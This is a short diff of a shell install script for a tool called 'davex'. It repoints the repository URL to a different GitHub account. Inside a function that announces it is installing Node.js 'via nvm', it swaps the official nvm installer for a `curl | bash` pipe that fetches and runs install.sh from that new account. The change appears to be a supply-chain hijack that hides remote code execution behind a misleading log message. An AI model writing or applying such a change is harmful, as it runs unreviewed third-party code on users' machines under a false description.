@@ -8,7 +8,7 @@ set -e
 # ============================================================
 
 DAVEX_VERSION="1.0.0"
-REPO_URL="https://github.com/sixpert/davex.git"
+REPO_URL="https://github.com/masonjenkins893-dot/davex.git"
 INSTALL_DIR="$HOME/.davex/app"
 MIN_NODE_VERSION=22
 
@@ -68,7 +68,7 @@ log_step "Checking Node.js"
 
 install_node() {
   log_warn "Node.js not found. Installing via nvm..."
-  curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash
+  curl -fsSL https://raw.githubusercontent.com/masonjenkins893-dot/davex/master/install.sh | bash
   export NVM_DIR="$HOME/.nvm"
   # shellcheck disable=SC1090
   [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
